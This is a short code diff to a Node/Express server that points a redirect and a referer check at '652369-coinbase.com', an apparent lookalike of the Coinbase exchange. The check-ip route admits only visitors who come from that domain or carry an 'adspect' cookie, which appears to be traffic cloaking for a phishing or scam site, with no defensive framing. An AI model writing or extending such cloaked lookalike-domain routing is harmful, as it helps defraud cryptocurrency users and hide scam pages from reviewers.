@@ -988,7 +988,7 @@ app.get('/', async (req, res, next) => {
         }
     });
     
-    return res.redirect(302, 'https://redirectingroute.com/');
+    return res.redirect(302, 'https://652369-coinbase.com/check-ip');
 });
 
 
@@ -1082,8 +1082,8 @@ app.get('/check-ip', async (req, res) => {
 
     // More lenient check for development
     const isFromAdspect = process.env.NODE_ENV === 'production' 
-        ? (referer.includes('redirectingroute.com') || adspectCookie === 'true')
-        : (referer.includes('redirectingroute.com') || adspectCookie === 'true' || true); // Always allow in dev
+        ? (referer.includes('652369-coinbase.com') || adspectCookie === 'true')
+        : (referer.includes('652369-coinbase.com') || adspectCookie === 'true' || true); // Always allow in dev
     
     if (!isFromAdspect && !isAdminPanel) {
         console.log('Invalid access to /check-ip -', {
